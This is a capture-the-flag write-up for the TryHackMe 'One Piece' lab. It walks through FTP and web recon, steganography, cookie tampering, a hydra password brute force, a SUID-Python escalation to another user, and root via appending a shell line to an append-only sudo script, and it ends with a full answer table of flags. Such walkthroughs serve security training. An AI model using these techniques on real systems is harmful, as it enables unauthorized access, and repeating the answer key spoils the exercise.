# TryHackMe — One Piece

> Follow the Straw Hats across the New World: FTP dotfiles, a four-stage encoding chain, steganography, and an append-only file that turns out to be the whole privesc.

## Recon

```bash
nmap -sS -T4 -p- --min-rate 1000 -Pn <target-ip>
nmap -sV -sC -p 21,22,80 <target-ip>
```

```
21/tcp  vsftpd 3.0.3          anonymous login allowed
22/tcp  OpenSSH 7.6p1
80/tcp  Apache httpd 2.4.29
```

Web root holds only `/css`, `/images` and `/index.html` — a medium dirbust finds nothing more. That thinness is the point: the trail runs through FTP and through files referenced by stylesheets, not through paths a wordlist would guess.

### The page source

`index.html` carries a long comment. It's **triple-encoded**:

```bash
python3 -c "
import base64
s='J5VEKNCJKZEXEUSD...GRUVCMCKONQTGTJ5'
b32 = base64.b32decode(s + '='*((-len(s))%8))
b64 = base64.b64decode(b32)
print(base64.a85decode(b64).decode())
"
```

```
Nami ensures there are precisely 3472 possible places where she could have lost it.
```

**3472 is a rabbit hole.** It's not a port (closed, TCP and UDP), not a path (404), and no wordlist on the system has that many lines. The box even ships an `images/rabbit_hole.png` to signal the theme. Don't spend time on it — I did, and it cost about twenty minutes.

---

## The Whale Tree — 1st Road Poneglyph

Anonymous FTP has a **hidden directory**, which the nmap `ftp-anon` listing doesn't show. Mirror the whole thing rather than fetching the one file nmap named:

```bash
wget -r -nH -P ./ftp ftp://anonymous:anonymous@<target-ip>/
find ./ftp -type f
```

```
./ftp/welcome.txt
./ftp/.the_whale_tree/.secret_room.txt
./ftp/.the_whale_tree/.road_poneglyph.jpeg
```

**Q: Name of the tree containing the 1st Road Poneglyph → `The Whale`**

The jpeg carries the first Poneglyph string behind steghide with an **empty passphrase**:

```bash
stegseek .road_poneglyph.jpeg /usr/share/wordlists/rockyou.txt
cat .road_poneglyph.jpeg.out
```

---

## The Apache Sea

### Dressrosa — Doflamingo

`/css` has directory listing on, and four island stylesheets nobody links to:

```bash
curl -s http://<target-ip>/css/
```

```
dressrosa_style.css   onigashima_style.css   random_style.css
style.css             whole_cake_style.css
```

`dressrosa_style.css` references an unlinked image at the web root:

```css
background-image: url("../king_kong_gun.jpg");
```

The path forward is in its JPEG comment — `file` alone shows it:

```bash
wget -q http://<target-ip>/king_kong_gun.jpg
file king_kong_gun.jpg
```

```
... comment: "Doflamingo is /ko.jpg" ...
```

**Q: 1st pirate on the Apache Sea → `Donquixote Doflamingo`**

```bash
wget -q http://<target-ip>/ko.jpg && file ko.jpg
```

```
... comment: "Congratulations, this is the Log Pose that should lead you
    to the next island: /wh0l3_c4k3.php"
```

Everything is leetspelled, which is why `/dressrosa`, `/whole_cake` and friends all 404.

### Whole Cake — 2nd Road Poneglyph

```bash
curl -s -i http://<target-ip>/wh0l3_c4k3.php | head -10
```

```
Set-Cookie: cookie=NoCakeForYou; ...
```

The page comments *"Big Mom likes cakes"*. Flip the cookie:

```bash
curl -s -b "cookie=CakeForYou" http://<target-ip>/wh0l3_c4k3.php
```

**Q: 2nd island → `Whole Cake`**

That yields the 2nd Poneglyph and points at `/r4nd0m.html`.

### Random island — Buggy

```bash
curl -s http://<target-ip>/r4nd0m.html | grep -oiE 'href="[^"]*"'
```

Two games under `/buggy_games/`. You don't have to beat either — the Log Pose is sitting in the JavaScript:

```bash
curl -s http://<target-ip>/buggy_games/brain_teaser.js | grep -i "log pose"
```

```javascript
document.getElementById('back').textContent = "Log Pose: /0n1g4sh1m4.php"
```

**Q: Friend met on the Apache Sea → `Buggy the Clown`**

### Onigashima — Kaido

**Q: 2nd Emperor → `Kaido of the Beasts`**

The page offers a login and a file upload, and taunts: *"Speaking about brute force, Kaido is unbeatable."* That's the instruction, not a warning.

Username comes out of `kaido.jpeg` (from `/images/`):

```bash
stegseek kaido.jpeg /usr/share/wordlists/rockyou.txt
cat kaido.jpeg.out
```

```
[i] Found passphrase: "imabeast"
Username:K1ng_0f_th3_B3@sts
```

Get the failure string before hydra, or every password reports as valid:

```bash
curl -s -d "user=x&password=x&submit_creds=Login" http://<target-ip>/0n1g4sh1m4.php | grep -o ERROR
```

```bash
hydra -l 'K1ng_0f_th3_B3@sts' -P /usr/share/wordlists/rockyou.txt <target-ip> \
  http-post-form "/0n1g4sh1m4.php:user=^USER^&password=^PASS^&submit_creds=Login:F=ERROR" -t 64
```

Over the VPN this runs at ~3000 tries/min, so full rockyou is ~77 hours. The password (`thebeast`) is within the first 50k lines:

```bash
head -50000 /usr/share/wordlists/rockyou.txt > short.txt
```

~6 minutes. Login gives the 3rd Poneglyph and says the last location is *"unspecified"* — which is literally the path:

```bash
curl -s http://<target-ip>/unspecified
```

---

## Decoding the four Poneglyphs

Concatenate in order 1→2→4 (the fourth ends in `=` padding, confirming it's last) and run a six-stage chain:

**Base32 → Morse → Binary → Hex → Base58 → Base64**

```python
import base64, sys, re

MORSE = {'.-':'A','-...':'B','-.-.':'C','-..':'D','.':'E','..-.':'F','--.':'G',
'....':'H','..':'I','.---':'J','-.-':'K','.-..':'L','--':'M','-.':'N','---':'O',
'.--.':'P','--.-':'Q','.-.':'R','...':'S','-':'T','..-':'U','...-':'V','.--':'W',
'-..-':'X','-.--':'Y','--..':'Z','-----':'0','.----':'1','..---':'2','...--':'3',
'....-':'4','.....':'5','-....':'6','--...':'7','---..':'8','----.':'9','/':' '}

B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
def b58d(s):
    n = 0
    for ch in s.strip():
        n = n*58 + B58.index(ch)
    o = bytearray()
    while n > 0:
        o.append(n & 0xFF); n >>= 8
    return bytes(o[::-1])

raw = re.sub(r'\s+', '', open(sys.argv[1]).read())
s1 = base64.b32decode(raw + '='*((-len(raw)) % 8)).decode()
s2 = ''.join(MORSE.get(t, '') for t in s1.split())
bits = re.sub(r'[^01]', '', s2)
s3 = ''.join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits)-7, 8))
s4 = bytes.fromhex(re.sub(r'[^0-9a-fA-F]', '', s3)).decode()
s5 = b58d(s4.strip()).decode()
print(base64.b64decode(s5 + '='*((-len(s5)) % 4)).decode())
```

```
M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!
```

**Q: Hidden message of the 4 Road Poneglyphs → `M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!`**

Printing each intermediate stage is worth the extra lines — if the chain order is wrong you see exactly which step produces garbage instead of guessing at the whole thing.

---

## Foothold

```bash
ssh M0nk3y_D_7uffy@<target-ip>
```

`~/laugh_tale.txt` names the other boat:

**Q: Who is on Laugh Tale with Luffy → `Marshall D Teach`**

---

## Luffy → Teach: SUID Python

```bash
find / -perm -4000 -type f 2>/dev/null | grep -v snap
```

```
/usr/bin/gomugomunooo_king_kobraaa
```

```bash
ls -la /usr/bin/gomugomunooo_king_kobraaa
```

```
-rwsr-xr-x 1 7uffy_vs_T3@ch teach 4526456 ... 
```

A 4.5MB stripped ELF — PyInstaller-packed Python. Running it drops you straight into a REPL as uid 1000:

```python
>>> import os; print(os.getuid(), os.geteuid())
1001 1000
```

The obvious escalation **fails**:

```python
>>> import os; os.setuid(os.geteuid()); os.system("/bin/bash")
$ id
uid=1001(M0nk3y_D_7uffy)
```

Because for a non-root process `setuid()` sets only the *effective* uid, and **bash drops euid back to uid on startup** unless invoked with `-p`. Set all three ids instead:

```python
>>> import os; os.setresuid(1000, 1000, 1000); os.system("/bin/bash")
```

```
7uffy_vs_T3@ch@Laugh-Tale:~$
```

(`/bin/bash -p` works too.)

Teach's home has a readable password file:

```bash
cat /home/teach/.password.txt
cat /home/teach/luffy_vs_teach.txt
```

```
7uffy_vs_T3@ch:Wh0_w1ll_b3_th3_k1ng?
```

```
But in the end, Luffy thanks to his willpower won the fight.
```

**Q: What allowed Luffy to win the fight → `willpower`**

---

## Teach → root: the append-only file

SSH in properly (sudo misbehaves in the spawned shell):

```bash
ssh '7uffy_vs_T3@ch'@<target-ip>
sudo -l
```

```
(ALL) /usr/local/bin/less
```

```bash
ls -la /usr/local/bin/less
```

```
-rwxrwx-wx 1 root root 67 ... /usr/local/bin/less
```

The `-wx` for *other* means you can write it. But:

```bash
printf '#!/bin/bash\n/bin/bash\n' > /usr/local/bin/less
```

```
-bash: /usr/local/bin/less: Operation not permitted
```

**That error is the whole puzzle.** "Operation not permitted" is `EPERM`, not `EACCES` ("Permission denied") — the permission bits allow the write, so something else is refusing it. That's a file attribute. `lsattr` is itself denied, and the directory isn't writable so `mv` is out.

An **immutable** file (`chattr +i`) blocks every write. An **append-only** file (`chattr +a`) blocks truncation but still allows appends:

```bash
printf '\n/bin/bash\n' >> /usr/local/bin/less
sudo /usr/local/bin/less
```

```
Sorry, I can't tell you where is the One Piece
root@Laugh-Tale:/usr/local/bin# id
uid=0(root) gid=0(root) groups=0(root)
```

The script runs its original `echo`, then falls through to the appended line.

```bash
cat /usr/share/mysterious/on3_p1ec3.txt
```

```
One Piece: S3cr3ts_0f_tH3_W0rlD_&_0f_Th3_P@st$
```

---

## Answers

| Question | Answer |
|---|---|
| Tree with the 1st Road Poneglyph | `The Whale` |
| 1st pirate on the Apache Sea | `Donquixote Doflamingo` |
| 2nd island | `Whole Cake` |
| Friend met | `Buggy the Clown` |
| 2nd Emperor | `Kaido of the Beasts` |
| Hidden message of the 4 Poneglyphs | `M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!` |
| On Laugh Tale with Luffy | `Marshall D Teach` |
| What let Luffy win | `willpower` |
| The One Piece | `S3cr3ts_0f_tH3_W0rlD_&_0f_Th3_P@st$` |

---

## Notes

**`EPERM` and `EACCES` are different errors and mean different things.** "Permission denied" means the mode bits said no. "Operation not permitted" on a file you demonstrably have write permission on means an attribute is blocking it — and the difference between `chattr +i` and `chattr +a` is the difference between a dead end and a root shell. `>` versus `>>` was the entire privesc.

**Non-root `setuid()` only sets the effective uid, and bash undoes that.** Getting a SUID interpreter to hand over a usable shell needs `setresuid()` or `bash -p`; `os.setuid(os.geteuid())` followed by plain `bash` silently gives you back your own uid and looks like the SUID bit isn't working.

**Mirror FTP, don't trust the nmap listing.** `ftp-anon` reported one file. `wget -r` found a hidden directory holding two more — including the first Poneglyph. Dotfiles don't appear in a plain `ls`.

**Read the CSS.** Four unlinked stylesheets named after islands, one referencing an unlinked image, whose JPEG *comment* held the next path. No wordlist finds that chain; only reading the files does.

**`file` before `strings`.** Both `king_kong_gun.jpg` and `ko.jpg` put their payload in the JPEG comment field, which `file` prints in its one-line output. Two seconds each.

**Rate-limit reality on brute force.** ~3000 tries/min over the VPN makes full rockyou a 77-hour job. Slicing the first 50k lines found it in six minutes. Check the arithmetic before committing to a wordlist.

**Not every clue is a clue.** `3472` decodes out of a deliberately triple-encoded comment and means nothing — and the box ships `rabbit_hole.png` to tell you so. Time-box a lead that resists three different interpretations.

---

**Platform:** TryHackMe — [S0uls](https://tryhackme.com/p/S0uls)
**Lab:** Authorized training environment only.
